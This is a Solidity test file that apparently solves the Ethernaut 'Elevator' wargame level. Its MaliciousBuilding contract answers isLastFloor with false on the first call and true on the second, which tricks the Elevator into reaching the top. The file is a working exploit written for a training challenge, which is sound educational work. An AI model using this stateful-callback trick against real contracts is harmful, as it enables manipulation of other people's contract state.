// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Elevator.sol";
import "src/levels/ElevatorFactory.sol";

contract TestElevator is BaseTest {
    Elevator private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new ElevatorFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Elevator(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.top(), false);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);

        // Solve the Challenge
        MaliciousBuilding maliciousBuilding = new MaliciousBuilding(level);
        maliciousBuilding.goTo(1);

        vm.stopPrank();
    }
}

contract MaliciousBuilding {
    bool public top;
    Elevator elevator;

    constructor(Elevator _elevator) public {
        elevator = _elevator;
    }

    function isLastFloor(uint256) external returns (bool) {
        if (!top) {
            top = true;
            return false;
        }
        return top;
    }

    function goTo(uint256) external {
        elevator.goTo(1);
    }
}